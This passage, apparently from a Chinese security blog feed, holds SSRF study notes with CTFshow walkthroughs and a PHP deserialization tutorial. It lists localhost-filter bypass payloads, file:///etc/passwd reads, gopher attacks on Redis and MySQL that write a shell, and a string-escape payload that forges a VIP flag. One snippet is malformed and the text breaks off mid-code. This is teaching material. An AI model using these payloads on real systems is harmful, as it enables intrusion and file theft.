title="SSRF和文件包含黑盒如何区分？"></a>SSRF和文件包含黑盒如何区分？</h3><blockquote><p>1.分析参数关键字(url字样大概率SSRF，file字样大概率文件包含)<br>2.看参数值地址(文件包含一般只允许包含本地，看能不能包含远程地址)<br>3.分析页面响应</p><p>多方面多角度分析</p></blockquote><p>‍</p><h3 id="业务功能点："><a href="#业务功能点：" class="headerlink" title="业务功能点："></a>业务功能点：</h3><ul><li>社交分享功能：获取超链接的标题等内容进行显示</li><li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li><li>在线翻译：给网址翻译对应网页的内容</li><li>图片加载&#x2F;下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</li><li>图片&#x2F;文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</li><li>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</li><li>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</li><li>数据库内置功能：数据库的比如mongodb的copyDatabase函数</li><li>邮件系统：比如接收邮件服务器地址</li><li>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</li><li>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</li></ul><h3 id="URL关键参数："><a href="#URL关键参数：" class="headerlink" title="URL关键参数："></a>URL关键参数：</h3><ul><li>share</li><li>wap</li><li>url</li><li>link</li><li>src</li><li>source</li><li>target</li><li>u</li><li>display</li><li>sourceURl</li><li>imageURL</li><li>domain</li></ul><p>‍</p><h2 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h2><p>文件读取，加载，数据操作类的函数</p><blockquote><ul><li>file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。</li><li>readfile()：输出一个文件的内容。</li><li>fsockopen()：打开一个网络连接或者一个Unix 套接字连接。</li><li>curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。</li><li>fopen()：打开一个文件文件或者 URL。</li><li>……</li></ul></blockquote><p>‍</p><p>‍</p><h1 id="漏洞重点"><a href="#漏洞重点" class="headerlink" title="漏洞重点"></a>漏洞重点</h1><h2 id="伪协议利用"><a href="#伪协议利用" class="headerlink" title="伪协议利用"></a>伪协议利用</h2><ul><li><p>http:&#x2F;&#x2F;</p><p>Web常见访问，如<a href="http://127.0.0.1、http//127.0.0.1:8080%E3%80%81http://192.168.1.1%E3%80%81http://192.168.1.2%E7%AD%89">http://127.0.0.1、http://127.0.0.1:8080、http://192.168.1.1、http://192.168.1.2等</a></p><p><img src="/assets/image-20240824181952-j75gyrv.png" alt="image">​</p><p><img src="/assets/image-20240824182001-btvhlh6.png" alt="image">​</p><p><img src="/assets/image-20240824182015-m6szgjy.png" alt="image">​</p><p><img src="/assets/image-20240824182029-6gwldw0.png" alt="image">​</p></li><li><p>file:&#x2F;&#x2F;&#x2F;<br>从文件系统中获取文件内容，如，file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd、file:&#x2F;&#x2F;&#x2F;D:&#x2F;1.txt</p><p><img src="/assets/image-20240824182147-y8n8mg4.png" alt="image">​</p></li><li><p>dict:&#x2F;&#x2F; （常用）<br>字典服务器协议，访问字典资源，如，dict:&#x2F;&#x2F;&#x2F;ip:6379&#x2F;info</p></li><li><p>gopher:&#x2F;&#x2F; （常用）<br>分布式文档传递服务，可使用gopherus生成payload<br>有部分服务是http协议不支持通讯的，那么可以用gopher来进行通讯（如mysql，redis服务等）<br>应用：漏洞利用 或 信息收集 通讯相关服务的时候 </p><p>工具：<a href="https://github.com/tarunkant/Gopherus">Gopherus</a></p></li><li><p>sftp:&#x2F;&#x2F;<br>SSH文件传输协议或安全文件传输协议</p></li><li><p>ldap:&#x2F;&#x2F;<br>轻量级目录访问协议</p></li><li><p>tftp:&#x2F;&#x2F;<br>简单文件传输协议</p></li></ul><p>‍</p><p>‍</p><h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><p> 禁用了127.0.0.1可以以下方法绕过</p><ol><li><p>10进制ip或者16进制ip</p></li><li><p><a href="http://localhost/">http://localhost/</a></p></li><li><p>windows中0.0.0.0和0也是127.0.0.1 Linux中是 0</p></li><li><p>127。0。0。1</p></li><li><p>可以使用@符号来绕过 <a href="http://a%40127.0.0.1:80@baidu.com,对于php来说hostname是bai/">http://a@127.0.0.1:80@baidu.com,对于php来说hostname是bai</a> du.com，但是对于curl来说(小于7.54.0)hostname是127.0.0.1</p></li><li><p>短网址</p></li><li><p>[::]绕过</p><p> http:&#x2F;&#x2F;[:127.0.0.1:]:80</p><p> http:&#x2F;&#x2F;[::]:80&#x2F;     #在liunx下可用，window测试了下不行</p></li><li><p>127.0.0.1写成127.1</p></li><li><p>http:&#x2F;&#x2F;①②⑦.⓪.⓪.①</p></li><li><p><a href="http://127.0.0.1/">http://127.00000.00000.001/</a>       #0的数量多一点少一点都没影响，最后还是会指向127.0.0.1</p></li><li><p><a href="http://127.127.127.127/flag.php">http://127.127.127.127/flag.php</a></p></li><li><p>302跳转 xx.php内容</p><p> url&#x3D;<a href="http://xxx/xx.php">http://xxx/xx.php</a></p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>Location:http:<span class="hljs-comment">//127.0.0.1/flag.php&quot;);</span><br></code></pre></td></tr></table></figure></li></ol><p>‍</p><p>这些域名 解析都是127.0.0.1 利用DNS解析配置来绕过</p><p>safe.taobao.com</p><p>114.taobao.com</p><p>ecd.tencent.com</p><p>wifi.aliyun.com</p><p>sudo.cc</p><p>‍</p><p>‍</p><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><ol><li>对外网、服务器所在内网、服务器本地进行端口扫描，获取一些服务的banner信息等。</li><li>攻击运行在内网或服务器本地的其他应用程序，如redis、mysql等。</li><li>对内网Web应用进行指纹识别，识别企业内部的资产信息。</li><li>攻击内外网的Web应用，主要是使用HTTP GET&#x2F;POST请求就可以实现的攻击，如sql注入、文件上传等。</li><li>利用file协议读取服务器本地文件等。</li><li>进行跳板攻击等。</li></ol><p>‍</p><h1 id="防御思路"><a href="#防御思路" class="headerlink" title="防御思路"></a>防御思路</h1><ol><li>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。</li><li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</li><li>限制请求的端口为http常用的端口，比如，80,443,8080,8090</li><li>黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网</li><li>禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F; 等引起的问题。</li></ol><p>‍</p><p>‍</p><h1 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h1><ul><li><p>白盒–CTFshow</p><ol><li><p>web351—无过滤直接获取</p><p> <img src="/assets/image-20240824164431-tfdf8v7.png" alt="image">​</p><p> 法一：http协议</p><p> <img src="/assets/image-20240824164454-z56ivfa.png" alt="image">​</p><p> 法二：file协议</p><p> <img src="/assets/image-20240824164729-gecu1qx.png" alt="image">​</p><p> <img src="/assets/image-20240824164927-a5rpmsw.png" alt="image">​</p></li><li><p>web352，353—IP地址进制绕过</p><p> <img src="/assets/image-20240824165141-6ss3jeq.png" alt="image">​</p><p> <img src="/assets/image-20240824165240-4lhhjqt.png" alt="image">​</p><p> 十六进制(需要添加上0x)<br> 0x的目的是为了表示后面的数是十六进制,在编程里面一般都要加入,用来区别十进制数<br> url=<a href="http://127.0.0.1/flag.php">http://0x7F.0.0.1/flag.php</a></p><p> <img src="/assets/image-20240824165310-7vjkloy.png" alt="image">​</p><p> 八进制<br> url=<a href="http://127.0.0.1/flag.php">http://0177.0.0.1/flag.php</a></p><p> 10 进制全部转换<br> url=<a href="http://127.0.0.1/flag.php">http://2130706433/flag.php</a></p><p> 16 进制全部转换，还是上面那个网站转换记得前缀0x<br> url&#x3D;<a href="http://127.0.0.1/flag.php">http://0x7F000001/flag.php</a></p><p> 还有一种特殊的省略模式<br> 127.0.0.1写成127.1</p><p> 用CIDR绕过localhost<br> url&#x3D;<a href="http://127.127.127.127/flag.php">http://127.127.127.127/flag.php</a></p><p> 还有很多方式<br> url&#x3D;<a href="http://0.0.0.0/flag.php">http://0/flag.php</a><br> url&#x3D;<a href="http://0.0.0.0/flag.php">http://0.0.0.0/flag.php</a></p><p> <img src="/assets/image-20240824165336-58vd8gy.png" alt="image">​</p><p> <img src="/assets/image-20240824165400-gxljh84.png" alt="image">​</p><p> <img src="/assets/image-20240824165450-r1hx4vv.png" alt="image">​</p></li><li><p>web354—域名解析IP绕过</p><p> test.xiaodi8.com -&gt; 127.0.0.1</p><p> <img src="/assets/image-20240824165657-7k1toq5.png" alt="image">​</p><p> <img src="/assets/image-20240824165722-dddwm4u.png" alt="image">​</p><p> <img src="/assets/image-20240824165745-b405shx.png" alt="image">​</p></li><li><p>web355，356—长度限制IP绕过</p><p> <img src="/assets/image-20240824165835-yx8f0ap.png" alt="image">​</p></li><li><p>web357—利用重定向解析绕过</p><p> 在自己服务器上写一个重定向脚本xx.php</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:http://127.0.0.1/flag.php&quot;</span>); <br>其作用是：当执行该脚本时，会直接跳转到对应的网址，即Location: 后面的网址。<br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20240824165946-9pwc7pd.png" alt="image">​</p></li><li><p>web358—匹配且不影响写法解析</p><p> <img src="/assets/image-20240824170154-x5oqk9a.png" alt="image">​</p><p> <img src="/assets/image-20240824170128-q5dsw9h.png" alt="image">​</p></li><li><p>web359，web360—利用gopher协议打服务</p><p> 工具地址—<a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p><ul><li><p>web359-mysql</p><p><img src="/assets/image-20240824170302-ucnrjno.png" alt="image">​</p><p><img src="/assets/image-20240824171046-6dapbaj.png" alt="image">​</p><p><img src="/assets/image-20240824171116-q0t3prp.png" alt="image">​</p><p><img src="/assets/image-20240824171136-odj0h3i.png" alt="image">​</p><p><img src="/assets/image-20240824171738-967pz0a.png" alt="image">​</p><p><img src="/assets/image-20240824171816-rpq0ggc.png" alt="image">​</p></li><li><p>web360-redis</p><p><img src="/assets/image-20240824172719-a6on9j4.png" alt="image">​</p><p><img src="/assets/image-20240824172749-k9vyekd.png" alt="image">​</p><p>成功写入shell</p><p><img src="/assets/image-20240824172909-vyobrn4.png" alt="image">​</p><p><img src="/assets/image-20240824174927-e3g0qnd.png" alt="image">​</p></li></ul></li></ol></li><li><p>黑盒</p><p><img src="/assets/image-20240824175021-qdbpii1.png" alt="image">​</p><p><img src="/assets/image-20240824175037-ee8bwg6.png" alt="image">​</p><p>两个真实案例:</p><p><img src="/assets/image-20240824175108-xrb7km1.png" alt="image">​</p><p><img src="/assets/image-20240824175121-735rej6.png" alt="image">​</p></li><li><p>SRC(文件导出&#x2F;格式转换 SSRF)</p><p><img src="/assets/image-20240824175259-j6vudok.png" alt="image">​</p><p><img src="/assets/image-20240824175313-os91mgt.png" alt="image">​</p><p><img src="/assets/image-20240824175328-mielh9m.png" alt="image">​</p><p><img src="/assets/image-20240824175343-ax27fh4.png" alt="image">​</p><p><img src="/assets/image-20240824175401-6j3s55c.png" alt="image">​</p><p><img src="/assets/image-20240824175459-9pns2w4.png" alt="image">​</p><p><img src="/assets/image-20240824175513-3fjg4ny.png" alt="image">​</p><p><img src="/assets/image-20240824175538-udg9xrq.png" alt="image">​</p></li></ul><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>WEB攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB攻防</tag>
      
      <tag>SSRF漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列化漏洞🦇</title>
    <link href="/2024/03/26/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%F0%9F%A6%87/"/>
    <url>/2024/03/26/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%F0%9F%A6%87/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p><img src="/assets/image-20240827180209-kc788pf.png" alt="image">​</p><p><img src="/assets/image-20240827180248-06g0yq5.png" alt="image">​</p><p>‍</p><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>对象转换为数组或字符串等格式</p><p>serialize() &#x2F;&#x2F;将对象转换成一个字符串</p><p><img src="/assets/image-20240827180336-qblwgps.png" alt="image">​</p><p>‍</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>将数组或字符串等格式转换成对象</p><p>unserialize() &#x2F;&#x2F;将字符串还原成一个对象</p><p><img src="/assets/image-20240827180404-0x33gtw.png" alt="image">​</p><p>‍</p><h2 id="各类语言序列化和反序列化函数"><a href="#各类语言序列化和反序列化函数" class="headerlink" title="各类语言序列化和反序列化函数"></a>各类语言序列化和反序列化函数</h2><ul><li>Java： Serializable Externalizable 接口、fastjson、jackson、gson、ObjectInputStream.read、ObjectObjectInputStream.readUnshared、XMLDecoder.read、ObjectYaml.loadXStream.fromXML、ObjectMapper.readValue、JSON.parseObject 等</li><li>PHP： serialize()、 unserialize()</li><li>Python：pickle marshal json PyYAML shelve PIL unzip</li></ul><p>‍</p><p>‍</p><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>常见魔术方法</p><p><img src="/assets/image-20240827180630-f01srp3.png" alt="image">​</p><ul><li><p><code>__construct()</code>​：当对象new的时候会自动调用</p><p><img src="/assets/image-20240827181157-ph169dl.png" alt="image">​</p><p><img src="/assets/image-20240827181219-fv4dnxj.png" alt="image">​</p><p><img src="/assets/image-20240827181233-ig12t49.png" alt="image">​</p></li><li><p><code>__destruct()</code>​：当对象被销毁时会被自动调用</p><p><img src="/assets/image-20240827181247-i6g21rb.png" alt="image">​</p><p><img src="/assets/image-20240827181301-kf2ae4x.png" alt="image">​</p></li><li><p><code>__sleep()</code>​：serialize()执行时被自动调用</p><p><img src="/assets/image-20240827181330-5jbyb2i.png" alt="image">​</p><p><img src="/assets/image-20240827181352-nj5dz5u.png" alt="image">​</p><p><img src="/assets/image-20240827181408-7kat9uj.png" alt="image">​</p><p><img src="/assets/image-20240827181443-cifvo8m.png" alt="image">​</p><p><img src="/assets/image-20240827181521-bcvgoj7.png" alt="image">​</p></li><li><p><code>__wakeup()</code>​：unserialize()时会被自动调用</p><p><img src="/assets/image-20240827181543-44k64xb.png" alt="image">​</p><p><img src="/assets/image-20240827181608-fcjythm.png" alt="image">​</p></li><li><p><code>__invoke()</code>​：把对象当作函数调用时触发</p><p><img src="/assets/image-20240827181625-3phqo5m.png" alt="image">​</p><p><img src="/assets/image-20240827181641-dhior01.png" alt="image">​</p></li><li><p><code>__toString()</code>​：把对象当作字符串使用时触发</p><p><img src="/assets/image-20240827181707-x1y0nxa.png" alt="image">​</p><p><img src="/assets/image-20240827181721-znzk0u7.png" alt="image">​</p></li><li><p><code>__call()</code>​：调用某个方法,若方法存在,则调用;若不存在,则会去调用__call函数。</p><p><img src="/assets/image-20240827181920-4a8wdic.png" alt="image">​</p><p><img src="/assets/image-20240827181940-310q8x5.png" alt="image">​</p><p><img src="/assets/image-20240827181954-c03npa8.png" alt="image">​</p></li><li><p><code>__get()</code>​：读取对象属性时,若存在,则返回属性值;若不存在，则会调用__get函数</p><p><img src="/assets/image-20240827182015-kgrjq8c.png" alt="image">​</p></li><li><p><code>__set()</code>​：设置对象的属性时,若属性存在,则赋值;若不存在,则调用__set函数。</p><p><img src="/assets/image-20240827182030-7z5iq0k.png" alt="image">​</p><p><img src="/assets/image-20240827182044-x3p13yn.png" alt="image">​</p><p><img src="/assets/image-20240827182116-7tzte1c.png" alt="image">​</p></li><li><p><code>__isset()</code>​：在不可访问的属性(私有的)上调用isset()或empty()触发(isset和empty是一样的)</p><p><img src="/assets/image-20240827182140-2wffah0.png" alt="image">​</p><p><img src="/assets/image-20240827182203-tv5v747.png" alt="image">​</p><p><img src="/assets/image-20240827182219-mxb0d84.png" alt="image">​</p><p><img src="/assets/image-20240827182234-ag0qsj7.png" alt="image">​</p><p><img src="/assets/image-20240827182250-u7xqj3m.png" alt="image">​</p><p><img src="/assets/image-20240827182310-w6m61f1.png" alt="image">​</p><p><img src="/assets/image-20240827182324-alfpmj0.png" alt="image">​</p><p><img src="/assets/image-20240827182344-3iodnxf.png" alt="image">​</p></li><li><p><code>__unset()</code>​：在不可访问的属性上使用unset()时触发</p><p><img src="/assets/image-20240827182400-7xr3qd5.png" alt="image">​</p><p><img src="/assets/image-20240827182415-ly5xlyb.png" alt="image">​</p></li><li><p><code>__set_state()</code>​：调用var_export()导出类时，此静态方法会被调用</p></li><li><p><code>__clone()</code>​：当对象复制完成时调用</p></li><li><p><code>__autoload()</code>​：尝试加载未定义的类</p></li><li><p><code>__debugInfo()</code>​：打印所需调试信息</p></li><li><p><code>__callStatic()</code>​：在静态上下文中调用不可访问的方法时触发</p></li></ul><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h1 id="如何测试"><a href="#如何测试" class="headerlink" title="如何测试"></a>如何测试</h1><h2 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h2><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h1 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h1><p>‍</p><h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><p>‍</p><h3 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h3><p>POP：面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，序列化攻击都在PHP魔术方法中出现可利用的漏洞，因自动调用触发漏洞，但如关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p><p>构造要点：删去不变的，留下要变的</p><p><img src="/assets/image-20240827192145-k0v3zzq.png" alt="image">​</p><p>‍</p><p>‍</p><h3 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h3><p>发现当输入admin时会被替换为hacker</p><p>‍</p><h4 id="增多"><a href="#增多" class="headerlink" title="增多"></a>增多</h4><p>这里采用字符串逃逸的方法来实现输出<code>flag is niubi</code>​</p><ol><li><p>观察源码</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVIP</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>, <span class="hljs-variable">$p</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$u</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$p</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;isVIP = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$isVip</span>=<span class="hljs-variable language_">$this</span>-&gt;isVIP;<br>        <span class="hljs-variable">$username</span>=<span class="hljs-variable language_">$this</span>-&gt;username;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$isVip</span>==<span class="hljs-number">1</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag is niubi&#x27;</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>            &#125;<br>        &#125;<br><br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/admin/&quot;</span>,<span class="hljs-string">&quot;hacker&quot;</span>,<span class="hljs-variable">$obj</span>);<br>&#125;<br><br><br><span class="hljs-comment">//$u=&#x27;admin&#x27;;</span><br><span class="hljs-comment">//$p=&#x27;123456&#x27;;</span><br><br><span class="hljs-comment">////无过滤序列化数据数据显示</span><br><span class="hljs-comment">//$obj = new user($u,$p);</span><br><span class="hljs-comment">//$obj = serialize($obj);</span><br><span class="hljs-comment">//echo $obj;</span><br><span class="hljs-comment">//echo &quot;\n&quot;;</span><br><br><span class="hljs-comment">////无过滤反序列化数据数据显示</span><br><span class="hljs-comment">//var_dump(unserialize($obj));</span><br><span class="hljs-comment">//echo &quot;\n&quot;;</span><br><br><span class="hljs-comment">//有过滤反序列化数据数据显示</span><br><span class="hljs-comment">//$obj1 = filter(serialize($obj));</span><br><span class="hljs-comment">//echo $obj1;</span><br><span class="hljs-comment">//var_dump(unserialize($obj1));</span><br><br><span class="hljs-variable">$obj</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$obj</span>))&#123;<br>    <span class="hljs-variable">$o</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$obj</span>);<br>    <span class="hljs-variable">$o</span>-&gt;<span class="hljs-title function_ invoke__">login</span>();<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p> 发现若要成功输出<code>flag is niubi</code>​则需让<code>$isVIP</code>​值为1且<code>$username</code>​的值为admin</p><p> 若要实现这些条件则要执行<code>login()</code>​函数,其执行需要调用GET传参中的x，并对其进行反序列化操作</p></li><li><p>根据源码得到正确的序列化语句</p><p> <code>O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code>​</p></li><li><p>但是由于源码过滤会将admin替换为hacker</p><p> <code>O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code>​</p></li><li><p>由于变量长度比变量名称小而出错即只能正常运行到<code>O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hacke</code>​而到后面的内容就会出错，所以我们尝试让后面的<code>r&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code>​实现逃逸并成功执行，让r为开始肯定会报错，所以选择<code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code>​这47位，在构造pop链过程中，每写一个admin就会替换为hacker即多一位</p><p> 所以我们需要47个admin，这样就会替换为47个hacker，即多出47位刚好等于<code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code>​</p><p> 可以理解为</p><p> 47 x <code>admin</code>​&#x3D;47 x 5 +<code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code>​ &#x3D; 47 x 6 位</p><p> 47 x <code>hacker</code>​&#x3D; 47 x 6 位</p></li><li><p>构造pop链,修改$isVIP的值为1</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVIP</span>=<span class="hljs-string">&#x27;1&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>, <span class="hljs-variable">$p</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$u</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$p</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;isVIP = <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/admin/&quot;</span>,<span class="hljs-string">&quot;hacker&quot;</span>,<span class="hljs-variable">$obj</span>);<br>&#125;<br><br><span class="hljs-variable">$u</span>=<span class="hljs-string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>;<br><span class="hljs-variable">$p</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;<br><br><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>(<span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span>);<br><span class="hljs-comment">//echo serialize($obj);</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>));<br><br><br><span 